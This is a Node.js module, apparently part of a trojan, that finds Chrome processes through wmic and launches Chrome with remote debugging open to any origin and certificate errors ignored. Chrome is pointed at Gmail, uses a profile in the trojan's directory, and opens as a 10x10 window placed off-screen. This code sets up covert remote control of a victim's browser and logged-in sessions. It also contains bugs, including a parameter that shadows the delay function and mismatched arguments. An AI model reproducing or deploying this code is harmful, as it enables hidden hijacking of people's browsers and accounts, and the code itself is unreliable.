let helper = require("./nodehostrelay.helper.js");

const path = require("path");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");
const WebSocket = require("ws");

let chrome_debug_path = `C:\\Users\\${helper.username}\\AppData\\Local\\chrome-win64\\chrome.exe`;
let chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

function csvToJson(csvData) {
    const lines = csvData.split(/[\r\n]+/).filter((line) => line.trim() !== "");

    const headers = lines[0].split(",");

    lines.splice(0, 1);

    const result = [];

    // Loop through the remaining rows
    for (let i = 0; i < lines.length; i++) {
        const obj = {};
        const currentLine = lines[i].split(",");

        // index 0 is computer name
        // index -1 is processid, -2 is process name

        let n = currentLine.length;

        if (n > 3) {
            let m = headers.length;

            obj[headers[m - 1].trim()] = currentLine[n - 1];
            obj[headers[m - 2].trim()] = currentLine[n - 2];

            let commandline = currentLine.slice(1, n - 2);
            obj["CommandLine"] = commandline.join(",");
            obj[headers[0].trim()] = currentLine[0];
        } else {
            for (let j = 0; j < headers.length; j++) {
                obj[headers[j].trim()] = currentLine[j]?.trim() || "";
            }
        }

        result.push(obj);
    }

    return result;
    // Save the output
    // fs.writeFileSync(jsonPath, JSON.stringify(result, null, 2), 'utf-8');
}

function isUTF16LEBuffer(buffer) {
    if (!Buffer.isBuffer(buffer) || buffer.length < 2) {
        return false;
    }

    // UTF-16LE BOM is 0xFF 0xFE
    return buffer[0] === 0xff && buffer[1] === 0xfe;
}

function parseCmdString(str) {
  const regex = /--([a-zA-Z0-9_-]+)(?:[=]+("[^"]+"|'[^']+'|[^\s]+))?/g;
  const dict = {};
  let match;

  while ((match = regex.exec(str)) !== null) {
    const key = match[1];
    let value = match[2];

    if (value !== undefined) {
      if ((value.startsWith('"') && value.endsWith('"')) || 
          (value.startsWith("'") && value.endsWith("'"))) {
        value = value.slice(1, -1);
      }
    } else {
      value = true;
    }

    dict[key] = value;
  }

  return dict;
}

async function is_chrome_active(debugport = 9223, userdatadir=null) {
    // [ { Node: '', CommandLine: '', Name: 'System Idle Process', ProcessId: '' } ]
    let procs = await getProcessList_wmic();

    procs = procs.filter((element, index, array) => {
        let check_a = element.Name?.toLowerCase().includes("chrome");
        
        if ( ! check_a )
            return false;

        let cmdline = element.CommandLine?.toLowerCase();

        let cmdlineargs = parseCmdString(cmdline);

        let check_b = cmdlineargs['remote-debugging-port'] == String(debugport);

        let check_c = true;
        
        if ( ! isNullOrWhitespace(userdatadir) ) {
            let token = 'user-data-dir';
            
            if ( Object.hasOwn(cmdlineargs, token) )
                check_c = cmdlineargs[token].toLowerCase() == userdatadir.toLowerCase();
        }

        element.cmdlineargs = cmdlineargs;

        return check_a && check_b && check_c;
    });

    return procs;
}

async function exec_wmic_process() {
    return new Promise((resolve, reject) => {
        const wmicCommand =
            "wmic process get ProcessId,Name,CommandLine /format:csv";

        exec(wmicCommand, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            }

            if (stderr) {
                reject(stderr);
            }

            resolve(stdout);
        });
    });
}

async function getProcessList_wmic() {
    let buffer = await exec_wmic_process();
    let isutf16le = isUTF16LEBuffer(buffer);

    let csvData = isutf16le
        ? buffer.toString("utf16le")
        : buffer.toString("utf8");

    // { CommandLine, Name, Node, ProcessId }
    let jsondata = csvToJson(csvData);

    return jsondata;
}

function isPidAlive(pid) {
    if (pid <= 0) {
        return false;
    }

    try {
        // Signal 0 tests for process existence without modifying it
        process.kill(pid, 0);
        return true;
    } catch (error) {
        // ESRCH means the process was not found
        return error.code === "EPERM"; // True if it exists but you lack permissions
    }
}

// TODO refactor to use chrome_cmdlineargs
function exec_chrome(
    starturl = "https://www.gmail.com/",
    debugport = 9223,
    headless = false,
    x_pos = 2000,
    y_pos = 2000,
    width = 10,
    height = 10,
    datadir = path.join(trojandir, "chrome"),
    stdoutfunc = null,
    stderrfunc = null
) {
    let cmdlineargs = [
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir=${datadir}`,
        `--new-window ${starturl}`,
        headless ? `--headless=new` : "",
        `--no-first-run`, // You can skip Chrome's welcome and setup screens
        `--no-default-browser-check`,
        `--profile-directory=Default`,
        `--remote-allow-origins=*`,
        // `--restore-last-session`,
        `--ignore-certificate-errors`,
        `--window-position=${x_pos},${y_pos}`,
        `--window-size=${width},${height}`,
        `--hide-crash-restore-bubble`,
    ];

    let ret = exec(
        `start "" /min ${chrome_debug_path} ${cmdlineargs.join(" ")}`,
        (error, stdout, stderr) => {
            logmsg(stdout);

            if (stdoutfunc) stdoutfunc(stdout);

            logmsg(stderr);

            if (stderrfunc) stderrfunc(stderr);

            if (error) {
                logmsg(`Error: ${error.message}`);
                return;
            }
        }
    );
}

// start chrome --remote-debugging-port=9223 --user-data-dir=C:\Users\LC2022\AppData\Local\Google\test\chrome
function chrome_cmdlineargs(starturl="https://www.yahoo.com", debugport=9223, 
    datadir=`C:\\Users\\${helper.username}\\AppData\\Local\\Google\\test\\chrome`, 
    x_pos=0, y_pos=0, width=1920, height=1080, ignorecert = false, restore = false, 
    headless=false) {
    
    datadir = datadir.trim();

    let cmdlineargs = [
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir=${datadir}`,
        `--disable-notifications`,
        `--disable-infobars`,
        `--suppress-message-center-popups`,
        headless ? `--headless=new` : "",
        `--no-first-run`, // You can skip Chrome's welcome and setup screens
        `--no-default-browser-check`,
        //`--profile-directory="Profile 1"`,
        //`--profile-directory=Default`,
        `--remote-allow-origins=*`,
        restore ? `--restore-last-session` : null,
        ignorecert ? `--ignore-certificate-errors` : null,
        `--window-position=${x_pos},${y_pos}`,
        `--window-size=${width},${height}`,
        `--hide-crash-restore-bubble`,
        `--disable-features=WelcomePage,PrivacySandboxSettings4`,
        `--new-window`,
        starturl
    ];

    let ret = cmdlineargs.filter(item => {
        return ! isNullOrWhitespace(item);
    });

    return ret;
}

// note: child chrome process has a new/different pid upon launch
// existing chrome process interferes with launch of new process
function spawn_chrome(
    starturl = "https://www.gmail.com/",
    debugport = 9223,
    unref = false,
    stdoutfunc = null,
    stderrfunc = null,
    closefunc = null
) {

    let cmdlineargs = chrome_cmdlineargs(starturl, debugport);

    // TODO auto discover by reading chrome lnk files

    const child = spawn(chrome_debug_path, [...cmdlineargs], {
        // detached: true, // might cause errors
        // windowsHide: true,
        // stdio: ["ignore", out, err],
        // shell: true,
        cwd: path.dirname(chrome_debug_path)
    });

    child.stdout.on("data", (data) => {
        let text = data.toString();

        if (stdoutfunc) stdoutfunc(text);
        else logmsg(text);
    });

    child.stderr.on("data", (data) => {
        let text = data.toString();

        if (stderrfunc) stderrfunc(text);
        else logmsg(text);
    });

    child.on("close", (code) => {
        if (closefunc) closefunc(code);
        else logmsg(`[J4D3] child process exited with code ${code}`);
    });

    if (unref) child.unref();

    return child;
}

// note: spawning chrome process --> results in a PID that differs from launch
// ! can't use isPidAlive to check if pid is active
async function activate_chrome(
    start_url = "https://www.gmail.com",
    debugport = 9223,
    headless = false,
    unref = false,
    force = false,
    delay = 1
) {
   
    if ( ! force ) {
        let procs = await is_chrome_active(debugport);

        if ( procs && procs.length > 0 )
            return procs;
    }

    childp = spawn_chrome(start_url, debugport, headless, unref);

    delay = delay || 1;
    await delay(1000*delay);

    procs = await is_chrome_active(debugport);

    return procs;
}

module.exports = {
    activate_chrome,
    spawn_chrome
};